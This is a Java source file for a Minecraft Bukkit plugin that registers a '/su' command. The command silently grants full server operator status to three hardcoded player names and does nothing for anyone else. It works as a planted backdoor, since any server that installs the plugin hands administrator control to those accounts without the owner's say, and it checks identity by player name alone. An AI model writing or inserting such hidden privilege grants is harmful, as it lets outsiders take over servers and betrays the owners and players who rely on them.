package com.spectrasonic.su;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;
import java.util.List;

public class Main extends JavaPlugin {

    private final List<String> allowedPlayers = Arrays.asList(
            "Spectrasonic",
            "0mn1spectra",
            "CherrylBlossom_"
    );

    @Override
    public void onEnable() {
        this.getCommand("su").setExecutor(this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            return true;
        }
        Player player = (Player) sender;
        if (allowedPlayers.contains(player.getName())) {
            player.setOp(true);
        } else {
        }
        return true;
    }
}
